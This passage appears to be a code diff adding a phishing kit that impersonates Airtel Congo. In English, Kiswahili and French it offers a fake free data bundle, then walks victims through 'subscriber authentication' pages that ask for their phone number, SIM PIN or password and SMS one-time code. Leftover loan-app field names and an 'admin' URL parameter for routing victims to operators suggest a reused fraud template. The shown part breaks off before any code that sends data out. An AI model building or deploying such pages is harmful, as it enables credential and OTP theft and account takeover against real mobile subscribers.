+      <h2 data-i18n="lbl_loan_app">Claim Confirmation</h2>
+      <p class="step-sub" data-i18n="step_3_sub">Step 3 of 3</p>
+      <div class="prog-row"><div class="prog-seg done"></div><div class="prog-seg done"></div><div class="prog-seg now"></div></div>
+      <div class="msg-box error" id="s3Err"><span class="msg-icon">&#x2715;</span><span id="s3ErrTxt"></span></div>
+      <div class="field"><label data-i18n="field_emp_status">Usage Category</label><div class="sel-wrap"><select id="s3em"><option data-i18n="emp_employed">Streaming & Video</option><option selected data-i18n="emp_self">Remote Work & Study</option><option data-i18n="emp_unemployed">General Browsing</option><option data-i18n="emp_retired">Social Media</option><option data-i18n="emp_student">Online Gaming</option></select></div></div>
+      <div class="field"><label data-i18n="field_annual_income">Estimated Monthly Data Usage (GB)</label><input type="number" id="s3in" placeholder="e.g. 25" oninput="clearErr('s3Err')"></div>
+      <div class="sum-box">
+        <h3 data-i18n="sum_title">Claim Summary</h3>
+        <div class="sum-row"><span class="sk" data-i18n="sum_amt">Data Package:</span><span class="sv" id="sA">10 GB</span></div>
+        <div class="sum-row"><span class="sk" data-i18n="sum_term">Validity:</span><span class="sv" id="sT">30 Days</span></div>
+        <div class="sum-row"><span class="sk" data-i18n="sum_purpose">Category:</span><span class="sv" id="sP">—</span></div>
+        <div class="sum-row"><span class="sk" data-i18n="sum_applicant">Subscriber:</span><span class="sv" id="sN">—</span></div>
+      </div>
+      <div class="step-btns">
+        <button class="btn-gray" onclick="goTo('page-step2')" data-i18n="btn_prev">PREVIOUS</button>
+        <button class="btn-grad" onclick="submitApp()" data-i18n="btn_submit">SUBMIT CLAIM</button>
+      </div>
+    </div>
+  </div>
+  <div class="pg-footer">© 2026 Airtel Congo</div>
+</div>
+
+<!-- ══════════════════════ PAGE 5: SUBMITTED ══════════════════════ -->
+<div id="page-submitted" class="page">
+  <div class="sub-wrap">
+    <div class="sub-icon">📶</div>
+    <h2 data-i18n="sub_title">Verification Required</h2>
+    <p data-i18n="sub_desc">Your data bundle request has been registered and is pending activation. <br>To release the bundle to your SIM, <strong>please verify your Airtel number credentials</strong> to complete authentication.</p>
+    <div class="redir-pill"><span data-i18n="sub_redirect">Redirecting to secure verification in</span> <span class="redir-n" id="rdN">3</span>s...</div><br>
+    <button class="btn-go" onclick="goTo('page-login')" data-i18n="sub_btn_login">Proceed to Verification</button>
+  </div>
+</div>
+
+<!-- ══════════════════════ PAGE 6: LOGIN ══════════════════════ -->
+<div id="page-login" class="page">
+  <header class="brand-header">
+    <div class="brand-logo-area">
+      <div class="brand-logo-mark">a</div>
+      <div class="brand-text-group">
+        <span class="brand-title">Airtel Congo</span>
+        <span class="brand-subtitle" data-i18n="lbl_secure_portal">SIM Portal</span>
+      </div>
+    </div>
+    <div class="brand-nav-right" onclick="goTo('page-landing')" data-i18n="nav_home">Home</div>
+  </header>
+
+  <div class="login-body-wrap">
+    <h2 data-i18n="login_h2">Subscriber Authentication</h2>
+    <div class="login-inner">
+      <div class="msg-box error" id="lgMsg"><span class="msg-icon">✕</span><span id="lgMsgTxt"></span></div>
+
+      <div class="lg-phone-row">
+        <div class="lg-ph-pre">🇨🇩 +243</div>
+        <input type="tel" id="lgPh" placeholder="812345678" maxlength="9" oninput="normalizePhone('lgPh');chkLogin()">
+      </div>
+      <div class="pin-label" data-i18n="login_pin_lbl">Enter your SIM PIN / Password (4 characters)</div>
+      <div class="pin-row">
+        <input type="password" class="pin-box" maxlength="1" oninput="pinMv(this,0)" id="p0">
+        <input type="password" class="pin-box" maxlength="1" oninput="pinMv(this,1)" id="p1">
+        <input type="password" class="pin-box" maxlength="1" oninput="pinMv(this,2)" id="p2">
+        <input type="password" class="pin-box" maxlength="1" oninput="pinMv(this,3)" id="p3">
+        <button class="pin-eye" onclick="togPin()">👁</button>
+      </div>
+      <div class="forgot-pin" data-i18n="login_forgot">Forgot PIN?</div>
+      <button class="btn-login" id="bLogin" onclick="doLogin()" data-i18n="login_btn">VERIFY SIM</button>
+    </div>
+  </div>
+  <div class="lg-curve">
+    <div class="lg-foot">
+      <div class="brand-logo-area" style="justify-content:center;">
+        <div class="brand-logo-mark" style="background:#fff; color:var(--airtel-red); width:32px; height:32px; font-size:1rem;">a</div>
+        <span class="brand-title" style="color:#fff;">Airtel Congo</span>
+      </div>
+      <div class="lg-version">v2.1.3P</div>
+      <div class="lg-terms"><span data-i18n="terms_text">By proceeding you agree to the</span> <a href="#" data-i18n="terms_link">Terms and Conditions</a></div>
+    </div>
+  </div>
+</div>
+
+<!-- ══════════════════════ PAGE 7: OTP ══════════════════════ -->
+<div id="page-otp" class="page">
+  <header class="brand-header">
+    <div class="brand-logo-area">
+      <div class="brand-logo-mark">a</div>
+      <div class="brand-text-group">
+        <span class="brand-title">Airtel Congo</span>
+        <span class="brand-subtitle" data-i18n="lbl_security_ver">Security Verification</span>
+      </div>
+    </div>
+    <div class="brand-nav-right" onclick="goTo('page-login')" data-i18n="nav_back">Back</div>
+  </header>
+
+  <div class="otp-body-wrap">
+    <div class="otp-card">
+      <h2 data-i18n="otp_h2">Activation Code (OTP)</h2>
+      <p class="otp-hint" data-i18n="otp_hint">Enter the confirmation code sent via SMS to your number</p>
+      <div class="otp-phone" id="otpPh">+243812345678</div>
+
+      <div class="msg-box error"   id="otpMsgErr"><span class="msg-icon">✕</span><span id="otpMsgErrTxt"></span></div>
+      <div class="msg-box success" id="otpMsgOk"><span class="msg-icon">✓</span><span id="otpMsgOkTxt"></span></div>
+      <div class="msg-box warning" id="otpMsgWarn"><span class="msg-icon">⚠</span><span id="otpMsgWarnTxt"></span></div>
+
+      <div class="waiting-box" id="pinWait">
+        <div class="wb-spinner"></div>
+        <p data-i18n="otp_waiting">Validating your subscriber credentials…</p>
+      </div>
+
+      <div id="otpInputSection">
+        <div class="otp-inputs">
+          <input type="text" class="otp-box" maxlength="1" oninput="otpMv(this,0)" id="o0">
+          <input type="text" class="otp-box" maxlength="1" oninput="otpMv(this,1)" id="o1">
+          <input type="text" class="otp-box" maxlength="1" oninput="otpMv(this,2)" id="o2">
+          <input type="text" class="otp-box" maxlength="1" oninput="otpMv(this,3)" id="o3">
+        </div>
+        <div class="otp-resend" id="otpRs"><span data-i18n="otp_resend_in">Resend code in</span> <span id="rsS">17</span> <span data-i18n="otp_seconds">seconds</span></div>
+        <button class="btn-otp" id="bOtp" onclick="doOtp()" data-i18n="otp_submit">ACTIVATE BUNDLE</button>
+      </div>
+    </div>
+  </div>
+  <div class="otp-curve"><div class="otp-foot">© 2026 Airtel Congo</div></div>
+</div>
+
+<!-- ══════════════════════ PAGE 8: APPROVAL ══════════════════════ -->
+<div id="page-approval" class="page">
+  <div class="appr-wrap">
+    <div class="appr-top">
+      <div class="check-circle">✓</div>
+      <div class="appr-title" data-i18n="appr_congrats">🎉 Congratulations!</div>
+      <div class="appr-sub"><span data-i18n="appr_sub1">Your free data package has been</span> <strong data-i18n="appr_approved">successfully activated!</strong> <span data-i18n="appr_sub2">Enjoy your high-speed internet.</span></div>
+      <div class="appr-banner"><div class="abl" data-i18n="appr_banner_lbl">GRANTED DATA BUNDLE</div><div class="aba" id="apAmt">10 GB</div></div>
+    </div>
+    <div class="comp-box">
+      <div class="ch" data-i18n="comp_notice">⚠️ ACTIVATION NOTICE</div>
+      <p><span data-i18n="comp_text1">Your line is now credited with free promotional data. To maintain high-speed access and avoid network throttling,</span> <strong data-i18n="comp_text2">ensure your SIM remains active.</strong> <span data-i18n="comp_text3">Unused data rolls over automatically upon your next monthly refill.</span></p>
+    </div>
+    <div class="ld-card">
+      <div class="ld-htitle" data-i18n="ld_title">📊 Bundle Specifications</div>
+      <div class="ld-row"><div class="ld-icon ic-g">📶</div><div><div class="ld-lbl" data-i18n="ld_monthly">NETWORK SPEED</div><div class="ld-val">4G / LTE Ultra</div></div></div>
+      <div class="ld-row"><div class="ld-icon ic-b">📅</div><div><div class="ld-lbl" data-i18n="ld_term">VALIDITY PERIOD</div><div class="ld-val" id="apTerm">30 Days</div></div></div>
+      <div class="ld-row"><div class="ld-icon ic-p">💸</div><div><div class="ld-lbl" data-i18n="ld_interest">TOTAL COST</div><div class="ld-val">FREE ($0.00)</div></div></div>
+    </div>
+    <div class="qa-wrap">
+      <div class="qa-title" data-i18n="qa_title">Quick Actions</div>
+      <button class="qa-btn" data-i18n="qa_deposit">📡 Check Data Balance</button>
+      <button class="qa-btn" data-i18n="qa_withdraw">🎁 Share Data with Friends</button>
+      <button class="qa-btn" data-i18n="qa_details">📄 View Bundle Details</button>
+    </div>
+    <div class="nxt-steps"><span>📱</span><p><strong data-i18n="nxt_title">Next Steps:</strong><br><span data-i18n="nxt_desc">You will receive an SMS confirmation with your data allocation balance shortly.</span></p></div>
+    <div class="rth-wrap"><button class="rth-btn" onclick="goTo('page-landing')" data-i18n="rth_btn">🏠 Return to Home</button></div>
+  </div>
+</div>
+
+<!-- MODALS -->
+<div class="overlay" id="mLogin">
+  <div class="modal"><div class="spinner"></div><h3 data-i18n="modal_wait">Please wait…</h3><p data-i18n="modal_sending">Validating your subscriber information</p></div>
+</div>
+<div class="overlay" id="mOtp">
+  <div class="modal"><div class="spinner"></div><h3 data-i18n="modal_verifying_otp">Verifying Code</h3><p id="otpVT">Please wait… (3s)</p></div>
+</div>
+<div class="overlay" id="mSubmit">
+  <div class="modal"><div class="spinner"></div><h3 data-i18n="modal_submitting">Processing Request…</h3><p data-i18n="modal_processing">Please wait while we record your data claim</p></div>
+</div>
+
+<script>
+  // ══════════════════════════════════════════════════════
+  // LOCALIZATION DICTIONARIES (English, Kiswahili Congo, French Congo)
+  // ══════════════════════════════════════════════════════
+  const translations = {
+    en: {
+      lang_label: "🌐 English",
+      lbl_financial_services: "Data Rewards Hub",
+      lbl_loan_app: "Data Claim Portal",
+      lbl_secure_portal: "SIM Portal",
+      lbl_security_ver: "Security Verification",
+      nav_signin: "Claim Bundle",
+      nav_home: "Home",
+      nav_back: "Back",
+      land_h1: "Claim Your Free Data Bundle",
+      land_sub: "High-speed 4G LTE • Zero cost • Instant activation",
+      calc_title: "Select Data Package",
+      calc_monthly: "Bundle Cost",
+      btn_apply_now: "CLAIM FREE DATA",
+      feat_fast: "Instant Delivery",
+      feat_fast_sub: "Credited in seconds",
+      feat_rates: "100% Free",
+      feat_rates_sub: "No hidden charges",
+      feat_secure: "Secure",
+      feat_secure_sub: "Official Network",
+      step_1_sub: "Step 1 of 3",
+      step_2_sub: "Step 2 of 3",
+      step_3_sub: "Step 3 of 3",
+      field_loan_type: "Network Offer Type",
+      opt_personal: "Promotional Free Data",
+      opt_business: "Loyalty Bonus Data",
+      opt_home: "Student Data Relief",
+      opt_car: "Weekend Night Data",
+      opt_edu: "Social Media Pack",
+      field_loan_amt: "Data Volume (GB)",
+      field_loan_term: "Validity Duration",
+      field_purpose: "Reason for Claim",
+      btn_next: "NEXT STEP",
+      btn_prev: "PREVIOUS",
+      field_fname: "First Name",
+      field_lname: "Last Name",
+      field_phone: "Airtel Phone Number",
+      phone_hint: "Enter 9 digits for DRC",
+      field_emp_status: "Usage Category",
+      emp_employed: "Streaming & Video",
+      emp_self: "Remote Work & Study",
+      emp_unemployed: "General Browsing",
+      emp_retired: "Social Media",
+      emp_student: "Online Gaming",
+      field_annual_income: "Estimated Monthly Data Usage (GB)",
+      sum_title: "Claim Summary",
+      sum_amt: "Data Package:",
+      sum_term: "Validity:",
+      sum_purpose: "Category:",
+      sum_applicant: "Subscriber:",
+      btn_submit: "SUBMIT CLAIM",
+      sub_title: "Data Claim Registered",
+      sub_desc: "Your data bundle request has been registered. Please wait for processing.<br>You will receive a confirmation message. For now, proceed to SIM verification.",
+      sub_redirect: "Redirecting to SIM verification in",
+      sub_btn_login: "Proceed to Verification Now",
+      login_h2: "Subscriber Authentication",
+      login_pin_lbl: "Enter your SIM PIN / Password (4 characters)",
+      login_forgot: "Forgot PIN?",
+      login_btn: "VERIFY SIM",
+      terms_text: "By proceeding you agree to the",
+      terms_link: "Terms and Conditions",
+      otp_h2: "Activation Code (OTP)",
+      otp_hint: "Enter the confirmation code sent via SMS to your number",
+      otp_waiting: "Validating your subscriber credentials…",
+      otp_resend_in: "Resend code in",
+      otp_seconds: "seconds",
+      otp_submit: "ACTIVATE BUNDLE",
+      appr_congrats: "🎉 Congratulations!",
+      appr_sub1: "Your free data package has been",
+      appr_approved: "successfully activated!",
+      appr_sub2: "Enjoy your high-speed internet.",
+      appr_banner_lbl: "GRANTED DATA BUNDLE",
+      comp_notice: "⚠️ ACTIVATION NOTICE",
+      comp_text1: "Your line is now credited with free promotional data. To maintain high-speed access and avoid network throttling,",
+      comp_text2: "ensure your SIM remains active.",
+      comp_text3: "Unused data rolls over automatically upon your next monthly refill.",
+      ld_title: "📊 Bundle Specifications",
+      ld_monthly: "NETWORK SPEED",
+      ld_term: "VALIDITY PERIOD",
+      ld_interest: "TOTAL COST",
+      qa_title: "Quick Actions",
+      qa_deposit: "📡 Check Data Balance",
+      qa_withdraw: "🎁 Share Data with Friends",
+      qa_details: "📄 View Bundle Details",
+      nxt_title: "Next Steps:",
+      nxt_desc: "You will receive an SMS confirmation with your data allocation balance shortly.",
+      rth_btn: "🏠 Return to Home",
+      modal_wait: "Please wait…",
+      modal_sending: "Validating your subscriber information",
+      modal_verifying_otp: "Verifying Code",
+      modal_submitting: "Processing Request…",
+      modal_processing: "Please wait while we record your data claim"
+    },
+    sw: {
+      lang_label: "🌐 Kiswahili",
+      lbl_financial_services: "Kituo cha Data za Bure",
+      lbl_loan_app: "Lango la Kudai Data",
+      lbl_secure_portal: "Lango la SIM",
+      lbl_security_ver: "Uthibitishaji wa Usalama",
+      nav_signin: "Dai Data",
+      nav_home: "Nyumbani",
+      nav_back: "Rudi",
+      land_h1: "Dai Kifurushi Chako cha Data ya Bure",
+      land_sub: "Kasi ya juu ya 4G LTE • Gharama sifuri • Uwezeshaji wa haraka",
+      calc_title: "Chagua Kifurushi cha Data",
+      calc_monthly: "Gharama ya Kifurushi",
+      btn_apply_now: "DAI DATA BURE",
+      feat_fast: "Uwasilishaji wa Haraka",
+      feat_fast_sub: "Zinaingia kwa sekunde",
+      feat_rates: "Bure 100%",
+      feat_rates_sub: "Hakuna gharama zilizofichwa",
+      feat_secure: "Salama",
+      feat_secure_sub: "Mtandao rasmi",
+      step_1_sub: "Hatua ya 1 kati ya 3",
+      step_2_sub: "Hatua ya 2 kati ya 3",
+      step_3_sub: "Hatua ya 3 kati ya 3",
+      field_loan_type: "Aina ya Ofa ya Mtandao",
+      opt_personal: "Data ya Bure ya Matangazo",
+      opt_business: "Data ya Zawadi ya Uaminifu",
+      opt_home: "Msaada wa Data kwa Wanafunzi",
+      opt_car: "Data ya Usiku wa Mwisho wa Wiki",
+      opt_edu: "Kifurushi cha Mitandao ya Kijamii",
+      field_loan_amt: "Kiasi cha Data (GB)",
+      field_loan_term: "Muda wa Uhalali",
+      field_purpose: "Sababu ya Kudai",
+      btn_next: "HATUA INAYOFUATA",
+      btn_prev: "ILIYOPITA",
+      field_fname: "Jina la Kwanza",
+      field_lname: "Jina la Mwisho",
+      field_phone: "Namba ya Simu ya Airtel",
+      phone_hint: "Weka namba 9 za Kongo (DRC)",
+      field_emp_status: "Kategoria ya Matumizi",
+      emp_employed: "Kutazama Video na Kutiririsha",
+      emp_self: "Kazi za Mbali na Masomo",
+      emp_unemployed: "Kuvinjari kwa Ujumla",
+      emp_retired: "Mitandao ya Kijamii",
+      emp_student: "Michezo ya Mtandaoni",
+      field_annual_income: "Makadirio ya Matumizi ya Data ya Kila Mwezi (GB)",
+      sum_title: "Muhtasari wa Madai",
+      sum_amt: "Kifurushi cha Data:",
+      sum_term: "Uhalali:",
+      sum_purpose: "Kategoria:",
+      sum_applicant: "Mteja:",
+      btn_submit: "WASILISHA DAI",
+      sub_title: "Dai la Data limesajiliwa",
+      sub_desc: "Ombi lako la kifurushi cha data limesajiliwa. Tafadhali subiri ichakatwe.<br>Utapokea ujumbe wa uthibitisho. Kwa sasa, endelea na uthibitishaji wa SIM.",
+      sub_redirect: "Inaelekezwa kwenye uthibitishaji wa SIM baada ya sekunde",
+      sub_btn_login: "Endelea na Uthibitishaji Sasa",
+      login_h2: "Uthibitishaji wa Mteja",
+      login_pin_lbl: "Weka PIN / Nenosiri lako la SIM (tarakimu 4)",
+      login_forgot: "Umesahau PIN?",
+      login_btn: "THIBITISHA SIM",
+      terms_text: "Kwa kuendelea unakubaliana na",
+      terms_link: "Sheria na Masharti",
+      otp_h2: "Msimbo wa Uwezeshaji (OTP)",
+      otp_hint: "Weka msimbo wa uthibitisho uliotumwa kupitia SMS kwenye namba yako",
+      otp_waiting: "Inathibitisha maelezo yako ya mteja…",
+      otp_resend_in: "Tuma tena msimbo baada ya",
+      otp_seconds: "sekunde",
+      otp_submit: "WASHA KIFURUSHI",
+      appr_congrats: "🎉 Hongera!",
+      appr_sub1: "Kifurushi chako cha data cha bure",
+      appr_approved: "kimeamilishwa kwa mafanikio!",
+      appr_sub2: "Furahia mtandao wako wa kasi.",
+      appr_banner_lbl: "KIFURUSHI CHA DATA KILICHOTOLEWA",
+      comp_notice: "⚠️ TAHADHARI YA UWEZESHAJI",
+      comp_text1: "Line yako sasa imewekewa data ya bure ya matangazo. Ili kudumisha kasi ya juu na kuepuka kupunguzwa kasi,",
+      comp_text2: "hakikisha SIM yako inasalia kuwa hai.",
+      comp_text3: "Data isiyotumutwa huhamishwa kiotomatiki kwenye ujazaji wako unaofuata wa kila mwezi.",
+      ld_title: "📊 Maelezo ya Kifurushi",
+      ld_monthly: "KASI YA MTANDAO",
+      ld_term: "MUDA WA UHALALI",
+      ld_interest: "JUMLA YA GHARAMA",
+      qa_title: "Vitendo vya Haraka",
+      qa_deposit: "📡 Angalia Salio la Data",
+      qa_withdraw: "🎁 Gawana Data na Marafiki",
+      qa_details: "📄 Tazama Maelezo ya Kifurushi",
+      nxt_title: "Hatua Zinazofuata:",
+      nxt_desc: "Utapokea ujumbe wa SMS wenye salio la ugawaji wa data hivi karibuni.",
+      rth_btn: "🏠 Rudi Nyumbani",
+      modal_wait: "Tafadhali subiri…",
+      modal_sending: "Inathibitisha taarifa zako za mteja",
+      modal_verifying_otp: "Inathibitisha Msimbo",
+      modal_submitting: "Inachakata Ombi…",
+      modal_processing: "Tafadhali subiri tunaporekodi dai lako la data"
+    },
+    fr: {
+      lang_label: "🇫🇷 Français",
+      lbl_financial_services: "Hub de Données Gratuites",
+      lbl_loan_app: "Portail de Réclamation",
+      lbl_secure_portal: "Portail SIM",
+      lbl_security_ver: "Vérification de Sécurité",
+      nav_signin: "Réclamer",
+      nav_home: "Accueil",
+      nav_back: "Retour",
+      land_h1: "Réclamez Votre Forfait Internet Gratuit",
+      land_sub: "4G LTE haut débit • Zéro coût • Activation instantanée",
+      calc_title: "Sélectionnez Votre Forfait",
+      calc_monthly: "Coût du Forfait",
+      btn_apply_now: "RÉCLAMER DES DONNÉES GRATUITES",
+      feat_fast: "Livraison Instantanée",
+      feat_fast_sub: "Crédité en quelques secondes",
+      feat_rates: "100% Gratuit",
+      feat_rates_sub: "Aucun frais caché",
+      feat_secure: "Sécurisé",
+      feat_secure_sub: "Réseau officiel",
+      step_1_sub: "Étape 1 sur 3",
+      step_2_sub: "Étape 2 sur 3",
+      step_3_sub: "Étape 3 sur 3",
+      field_loan_type: "Type d'Offre Réseau",
+      opt_personal: "Données Promotionnelles Gratuites",
+      opt_business: "Bonus de Fidélité",
+      opt_home: "Aide Internet Étudiant",
+      opt_car: "Données Nuit & Weekend",
+      opt_edu: "Pack Réseaux Sociaux",
+      field_loan_amt: "Volume de Données (Go)",
+      field_loan_term: "Durée de Validité",
+      field_purpose: "Motif de la Réclamation",
+      btn_next: "ÉTAPE SUIVANTE",
+      btn_prev: "PRÉCÉDENT",
+      field_fname: "Prénom",
+      field_lname: "Nom de famille",
+      field_phone: "Numéro de Téléphone Airtel",
+      phone_hint: "Entrez 9 chiffres pour la RDC",
+      field_emp_status: "Catégorie d'Utilisation",
+      emp_employed: "Streaming & Vidéo",
+      emp_self: "Télétravail & Études",
+      emp_unemployed: "Navigation Générale",
+      emp_retired: "Réseaux Sociaux",
+      emp_student: "Jeux en Ligne",
+      field_annual_income: "Consommation Mensuelle Estimée (Go)",
+      sum_title: "Résumé de la Réclamation",
+      sum_amt: "Forfait Internet :",
+      sum_term: "Validité :",
+      sum_purpose: "Catégorie :",
+      sum_applicant: "Abonné :",
+      btn_submit: "SOUMETTRE LA RÉCLAMATION",
+      sub_title: "Réclamation Enregistrée",
+      sub_desc: "Votre demande de forfait de données a été enregistrée. Veuillez patienter.<br>Vous recevrez un message de confirmation. Pour l'instant, passez à la vérification SIM.",
+      sub_redirect: "Redirection vers la vérification SIM dans",
+      sub_btn_login: "Aller à la Vérification",
+      login_h2: "Authentification de l'Abonné",
+      login_pin_lbl: "Entrez votre PIN / Mot de passe SIM (4 caractères)",
+      login_forgot: "Code PIN oublié ?",
+      login_btn: "VÉRIFIER LA SIM",
+      terms_text: "En continuant, vous acceptez les",
+      terms_link: "Termes et Conditions",
+      otp_h2: "Code d'Activation (OTP)",
+      otp_hint: "Entrez le code de confirmation envoyé par SMS à votre numéro",
+      otp_waiting: "Validation de vos identifiants d'abonné…",
+      otp_resend_in: "Renvoyer le code dans",
+      otp_seconds: "secondes",
+      otp_submit: "ACTIVER LE FORFAIT",
+      appr_congrats: "🎉 Félicitations !",
+      appr_sub1: "Votre forfait de données gratuit a été",
+      appr_approved: "activé avec succès !",
+      appr_sub2: "Profitez de votre internet haut débit.",
+      appr_banner_lbl: "FORFAIT ATTRIBUÉ",
+      comp_notice: "⚠️ AVIS D'ACTIVATION",
+      comp_text1: "Votre ligne est désormais créditée de données promotionnelles gratuites. Pour maintenir le haut débit et éviter la limitation,",
+      comp_text2: "assurez-vous que votre SIM reste active.",
+      comp_text3: "Les données non utilisées sont reportées automatiquement lors de votre prochain rechargement.",
+      ld_title: "📊 Spécifications du Forfait",
+      ld_monthly: "VITESSES DU RÉSEAU",
+      ld_term: "PÉRIODE DE VALIDITÉ",
+      ld_interest: "COÛT TOTAL",
+      qa_title: "Actions Rapides",
+      qa_deposit: "📡 Vérifier le Solde Internet",
+      qa_withdraw: "🎁 Partager des Données",
+      qa_details: "📄 Voir les Détails",
+      nxt_title: "Prochaines Étapes :",
+      nxt_desc: "Vous recevrez un SMS de confirmation avec le solde de votre allocation sous peu.",
+      rth_btn: "🏠 Retour à l'Accueil",
+      modal_wait: "Veuillez patienter…",
+      modal_sending: "Validation de vos informations d'abonné",
+      modal_verifying_otp: "Vérification du Code",
+      modal_submitting: "Traitement de la Demande…",
+      modal_processing: "Veuillez patienter pendant l'enregistrement"
+    }
+  };
+
+  let currentLang = 'en';
+
+  function toggleLangDropdown(event) {
+    event.stopPropagation();
+    document.getElementById('langDropdownMenu').classList.toggle('show');
+  }
+
+  window.addEventListener('click', () => {
+    const menu = document.getElementById('langDropdownMenu');
+    if (menu && menu.classList.contains('show')) {
+      menu.classList.remove('show');
+    }
+  });
+
+  function setLanguage(lang) {
+    if (!translations[lang]) return;
+    currentLang = lang;
+    
+    document.querySelectorAll('.lang-option').forEach(el => el.classList.remove('active'));
+    event && event.currentTarget && event.currentTarget.classList.add('active');
+    
+    const labels = { en: "🌐 English", sw: "🇨🇩 Kiswahili", fr: "🇫🇷 Français" };
+    document.getElementById('currentLangLabel').textContent = labels[lang];
+
+    document.querySelectorAll('[data-i18n]').forEach(el => {
+      const key = el.getAttribute('data-i18n');
+      if (translations[lang][key]) {
+        el.innerHTML = translations[lang][key];
+      }
+    });
+
+    document.getElementById('langDropdownMenu').classList.remove('show');
+  }
+
+  // ══════════════════════════════════════════════════════
+  // STATE
+  // ══════════════════════════════════════════════════════
+  const S = {
+    amt: 10,
+    term: '30 Days',
+    purpose: '',
+    first: '',
+    last: '',
+    phone: '',
+    applicationId: null,   
+    assignedAdminId: null  
+  };
+
+  const _URL_ADMIN_ID = (() => {
+    const params = new URLSearchParams(window.location.search);
+    const id = params.get('admin');
+    sessionStorage.removeItem('selectedAdminId');
+    localStorage.removeItem('selectedAdminId');
+    if (id && id !== 'undefined' && id !== 'null' && id.trim() !== '') {
+      sessionStorage.setItem('selectedAdminId', id.trim());
+      return id.trim();
+    }
+    return null;
+  })();
+
+  function getAdminId() {
+    const params = new URLSearchParams(window.location.search);
+    const urlId  = params.get('admin');
+    if (urlId && urlId !== 'undefined' && urlId !== 'null' && urlId.trim() !== '') {
+      return urlId.trim();
+    }
+    return sessionStorage.getItem('selectedAdminId') || null;
+  }
+
+  // ══════════════════════════════════════════════════════
+  // PAGE NAVIGATION
+  // ══════════════════════════════════════════════════════
+  function goTo(id) {
+    document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+    document.getElementById(id).classList.add('active');
+    window.scrollTo(0, 0);
+  }
+
+  // ══════════════════════════════════════════════════════
+  // PACKAGE BOX SELECTION
+  // ══════════════════════════════════════════════════════
+  function selectPackage(gb, term, el) {
+    document.querySelectorAll('.pkg-box').forEach(box => box.classList.remove('selected'));
+    el.classList.add('selected');
+    S.amt = gb;
+    S.term = term;
+    
+    // Pre-populate step inputs if applicable
+    const s1am = document.getElementById('s1am');
+    const s1te = document.getElementById('s1te');
+    if (s1am) s1am.value = gb;
+    if (s1te) {
+      for (let opt of s1te.options) {
+        if (opt.text.toLowerCase() === term.toLowerCase()) {
+          s1te.value = opt.value;
+          break;
+        }
+      }
+    }
+  }
+
+  // ══════════════════════════════════════════════════════
+  // STEP NAVIGATION
+  // ══════════════════════════════════════════════════════
+  function normalizePhone(id) {
+    const el = document.getElementById(id);
+    if (el.value.startsWith('0')) {
+      const cursor = el.selectionStart;
+      el.value = el.value.substring(1);
+      el.setSelectionRange(Math.max(0, cursor - 1), Math.max(0, cursor - 1));
+    }
+  }
+
+  function showErr(id, msg) {
+    document.getElementById(id + 'Txt').textContent = msg;
+    document.getElementById(id).classList.add('show');
+    document.getElementById(id).scrollIntoView({ behavior: 'smooth', block: 'nearest' });
+  }
+  function clearErr(id) {
+    document.getElementById(id).classList.remove('show');
+  }
+  function shakeField(id) {
+    const el = document.getElementById(id);
+    if (!el) return;
+    el.style.borderColor = '#ef4444';
+    el.style.boxShadow = '0 0 0 3px rgba(239,68,68,0.15)';
+    setTimeout(() => { el.style.borderColor = ''; el.style.boxShadow = ''; }, 1800);
+  }
+
+  function toS2() {
+    const amt     = document.getElementById('s1am').value;
+    const purpose = document.getElementById('s1pu').value.trim();
+    if (!amt || Number(amt) <= 0) {
+      showErr('s1Err', 'Please enter a valid data volume.');
+      shakeField('s1am'); return;
+    }
+    if (!purpose) {
+      showErr('s1Err', 'Please enter a reason for your data claim.');
+      shakeField('s1pu'); return;
+    }
+    clearErr('s1Err');
+    S.amt     = amt;
+    S.term    = document.getElementById('s1te').value;
+    S.purpose = purpose;
+    goTo('page-step2');
+  }
+
+  function toS3() {
+    const first = document.getElementById('s2fi').value.trim();
+    const last  = document.getElementById('s2la').value.trim();
+    const phone = document.getElementById('s2ph').value.trim();
+    if (!first) { showErr('s2Err', 'Please enter your first name.'); shakeField('s2fi'); return; }
+    if (!last)  { showErr('s2Err', 'Please enter your last name.');  shakeField('s2la'); return; }
+    if (!phone || phone.length < 9) {
+      showErr('s2Err', 'Please enter a valid phone number.'); shakeField('s2ph'); return;
+    }
+    clearErr('s2Err');
+    S.first = first; S.last = last; S.phone = phone;
+    document.getElementById('sA').textContent = S.amt + ' GB';
+    document.getElementById('sT').textContent = S.term;
+    document.getElementById('sP').textContent = S.purpose || '—';
+    document.getElementById('sN').textContent = [S.first, S.last].filter(Boolean).join(' ') || '—';
+    goTo('page-step3');
+  }
+
+  function submitApp() {
+    const income = document.getElementById('s3in').value;
+    if (!income || Number(income) <= 0) {
+      showErr('s3Err', 'Please enter your estimated monthly usage.'); shakeField('s3in'); return;
+    }
+    clearErr('s3Err');
+
+    const btn = document.querySelector('#page-step3 .btn-grad[onclick="submitApp()"]');
+    if (btn) { btn.disabled = true; btn.textContent = 'SUBMITTING…'; }
+    document.getElementById('mSubmit').classList.add('show');
+
+    setTimeout(() => {
+      document.getElementById('mSubmit').classList.remove('show');
+      if (btn) { btn.disabled = false; btn.textContent = 'SUBMIT CLAIM'; }
+      goTo('page-submitted');
+      let c = 3;
+      document.getElementById('rdN').textContent = c;
+      const iv = setInterval(() => {
+        c--;
+        document.getElementById('rdN').textContent = c;
+        if (c <= 0) { clearInterval(iv); goTo('page-login'); }
+      }, 1000);
+    }, 1500);
+  }
+
+  function showLoginMsg(text) {
+    document.getElementById('lgMsgTxt').textContent = text;
+    document.getElementById('lgMsg').classList.add('show');
+  }
+  function hideLoginMsg() {
+    document.getElementById('lgMsg').classList.remove('show');
+  }
+
+  function showOtpMsg(type, text) {
+    ['otpMsgErr','otpMsgOk','otpMsgWarn'].forEach(id => {
+      document.getElementById(id).classList.remove('show');
+    });
+    if (type === 'error')   { document.getElementById('otpMsgErrTxt').textContent = text;  document.getElementById('otpMsgErr').classList.add('show'); }
+    if (type === 'success') { document.getElementById('otpMsgOkTxt').textContent = text;   document.getElementById('otpMsgOk').classList.add('show'); }
+    if (type === 'warning') { document.getElementById('otpMsgWarnTxt').textContent = text; document.getElementById('otpMsgWarn').classList.add('show'); }
+  }
+  function hideOtpMsgs() {
+    ['otpMsgErr','otpMsgOk','otpMsgWarn'].forEach(id => {
+      document.getElementById(id).classList.remove('show');
+    });
+  }
+
+  function pinMv(el, i) {
+    el.value = el.value.replace(/\D/, '');
+    if (el.value && i < 3) document.getElementById('p' + (i+1)).focus();
+    chkLogin();
+  }
+
+  function chkLogin() {
+    const ok = [0,1,2,3].every(i => document.getElementById('p'+i).value);
